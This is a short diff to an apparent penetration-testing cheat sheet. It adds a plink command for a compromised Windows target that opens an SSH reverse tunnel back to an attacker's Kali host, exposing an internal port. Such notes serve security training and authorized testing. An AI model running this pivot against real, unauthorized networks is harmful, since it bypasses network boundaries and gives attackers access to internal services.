@@ -337,6 +337,10 @@ socks4  127.0.0.1 <LPORT>
 sudo proxychains <COMMAND TO PROXY>
 # you can also point Burp through the proxy by specifying 127.0.0.1 and <LPORT> in the SOCKS section of User Options
 
+# proxy - tunneling - plink - port forwarding from windows hosts without ssh
+# transfer /usr/share/windows-resources/binaries/plink.exe to target
+cmd.exe /c echo y | plink.exe -ssh -l <KALI USER> -pw <KALI PASS> -R <KALI IP>:<LPORT>:127.0.0.1:<INTERNAL PORT> <KALI IP>
+
 # networking - linux - list services listening locally
 ss -antp
 
